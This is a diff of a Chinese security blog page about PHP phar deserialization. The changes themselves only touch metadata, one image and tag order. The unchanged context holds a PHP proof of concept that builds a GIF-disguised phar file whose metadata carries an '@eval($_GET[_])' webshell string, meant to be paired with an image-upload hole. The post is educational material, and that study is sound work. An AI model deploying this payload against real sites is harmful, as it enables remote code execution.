@@ -17,9 +17,8 @@
 <meta property="og:description" content="存一下利用方式">
 <meta property="og:locale" content="zh-cn">
 <meta property="og:image" content="https://img.5am3.com/images/20190406/fhx1kFJnVa5F.png?imageslim">
-<meta property="og:image" content="https://img.5am3.com/images/20190406/vXOILaLuIYtr.png?imageslim">
 <meta property="og:image" content="https://img.5am3.com/images/20190406/CQjQITG5Tp66.png?imageslim">
-<meta property="og:updated_time" content="2019-04-06T06:29:22.880Z">
+<meta property="og:updated_time" content="2019-04-06T06:32:03.661Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Phar反序列化学习">
 <meta name="twitter:description" content="存一下利用方式">
@@ -194,7 +193,6 @@
 <p>利用生成phar文件，结合图片上传漏洞上传，再通过phar://协议和file_exists函数反序列化利用</p>
 <p>图片生产代码</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// phar.readonly无法通过该语句进行设置: init_set("phar.readonly",0);</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyClass</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $output = <span class="string">'@eval($_GET[_]);'</span>;</span><br><span class="line">&#125;</span><br><span class="line">$o = <span class="keyword">new</span> MyClass();</span><br><span class="line">$filename = <span class="string">'poc.phar'</span>;<span class="comment">// 后缀必须为phar，否则程序无法运行</span></span><br><span class="line">file_exists($filename) ? unlink($filename) : <span class="keyword">null</span>;</span><br><span class="line">$phar=<span class="keyword">new</span> Phar($filename);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(<span class="string">"GIF89a&lt;?php __HALT_COMPILER(); ?&gt;"</span>);</span><br><span class="line">$phar-&gt;setMetadata($o);</span><br><span class="line">$phar-&gt;addFromString(<span class="string">"foo.txt"</span>,<span class="string">"bar"</span>);</span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p><img src="https://img.5am3.com/images/20190406/vXOILaLuIYtr.png?imageslim" alt="mark"></p>
 <p><img src="https://img.5am3.com/images/20190406/CQjQITG5Tp66.png?imageslim" alt="mark"></p>
 <p>本文转自mochazz师傅</p>
 <p>原文地址：<a href="https://mochazz.github.io/2019/02/02/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%A5%E9%97%A8%E4%B9%8Bphar/" target="_blank" rel="noopener">PHP反序列化入门之phar</a></p>
@@ -441,11 +439,11 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
           <ul class="article-tag-list" q-show="showTags">
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">writeup</a>
+                <a href="javascript:void(0)" class="js-tag color1">web学习</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">web学习</a>
+                <a href="javascript:void(0)" class="js-tag color3">writeup</a>
               </li>
              
               <li class="article-tag-list-item">
